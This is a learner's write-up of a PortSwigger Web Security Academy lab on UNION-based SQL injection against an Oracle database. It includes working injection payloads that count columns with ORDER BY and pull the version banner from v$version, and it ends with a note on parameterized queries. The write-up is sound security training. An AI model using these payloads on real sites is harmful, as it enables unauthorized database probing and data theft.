# Lab 03: SQL Injection – Querying Database Version on Oracle

## Lab Information
- **Platform:** PortSwigger Web Security Academy
- **Difficulty:** Apprentice
- **Category:** SQL Injection
- **Status:** Solved

## Objective
Retrieve the database type and version using SQL injection.

## Vulnerability
The website was vulnerable to SQL injection through the `category` parameter.

## Steps Taken

1. Intercepted the category request using Burp Suite.
2. Sent the request to Repeater.
3. Used `ORDER BY` to identify the number of columns.

```sql
Gifts' ORDER BY 1--
Gifts' ORDER BY 2--
Gifts' ORDER BY 3--
```

The third column caused an error, confirming that the original query returned two columns.

4. Tested Oracle UNION syntax:

```sql
Gifts' UNION SELECT 'test','test' FROM dual--
```

5. Retrieved the database version using:

```sql
Gifts' UNION SELECT banner,NULL FROM v$version--
```

## Result
Successfully retrieved Oracle database version information:

- Oracle Database 11g Express Edition Release 11.2.0.2.0
- PL/SQL Release 11.2.0.2.0
- NLSRTL Version 11.2.0.2.0

**Lab Status: Solved!**

## Key Concepts Learned
- UNION-based SQL injection
- Identifying column counts using ORDER BY
- Oracle's DUAL table
- Retrieving database information from `v$version`
- Using NULL to match column counts

## Prevention
Use parameterized queries (prepared statements) to prevent SQL injection.

## References
[PortSwigger – SQL Injection: Querying Database Version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
